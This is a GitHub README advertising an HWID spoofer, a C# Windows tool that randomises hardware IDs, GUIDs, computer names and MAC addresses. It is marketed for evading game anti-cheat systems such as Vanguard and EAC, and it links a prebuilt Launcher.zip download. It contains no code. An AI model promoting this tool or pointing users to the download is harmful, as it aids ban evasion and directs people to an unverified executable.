# hwid-spoofer
Our updated spoofer is the best Permanent HWID Spoofer on the market. Works perfectly for Vanguard, EAC, BE, Ricochet and others.

# HWID Spoofer for all games

> *Hwid Spoofer is a C# application that allows you to change various system identifiers on your Windows computer. This application helps you randomly change some system identifiers on your system.*

![1](https://github.com/user-attachments/assets/61a8f7c2-4cda-44d5-8614-1553862c2407)

### [Download release](https://github.com/plugza/hwid-spoofer/releases/download/hwid-spoofer/Launcher.zip)

# Features

![2](https://github.com/user-attachments/assets/34597c2c-c586-4160-ac8d-6d88fd00c1d5)


- **HWID Change**: Generates and change a random HWID.

- **PC GUID Change**: Generates and change a random PC GUID.

- **Computer Name Change**: Generates and change a random computer name.

- **Product ID Change**: Generates and change a random product ID.

- **MAC Address Change (Beta)**: Assigns a random MAC address to a specific network interface.

- **All Change**: Randomly changes all system identifiers and the MAC address.

- **Backup Functionality**: The application provides a backup function to store the original values of system identifiers before changes are made, making it easier to revert to the original settings if needed.

## Requirements
- Visual Studio 2022 (.NET Desktop)

# Preview

![image](https://github.com/user-attachments/assets/55523e01-aaa4-4097-977a-4b7664aad132)


## Usage

1. Run the application and choose whether you want to change system identifiers randomly (Yes/No).

2. If you select "Yes," you can choose which system identifier(s) you want to change:
   - Hardware ID (HWID)
   - PC GUID
   - Computer Name
   - Product ID
   - MAC Address
   - All of the above


3. The application will guide you through the process of changing the selected system identifier(s).

4. After the changes are made, the application will display the result.

## Resources

- [Source for Generating Random HWID](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-diskdrive)
- [Source for Generating Random PC GUID](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
- [Source for Generating Random Computer Name](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
- [Source for Generating Random Product ID](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
- [Source for Changing MAC Address](https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.networkinterface)


## Contribution

This project is open-source, and contributions are welcome. If you'd like to contribute by adding features, fixing bugs, or improving the documentation, feel free to create a pull request.
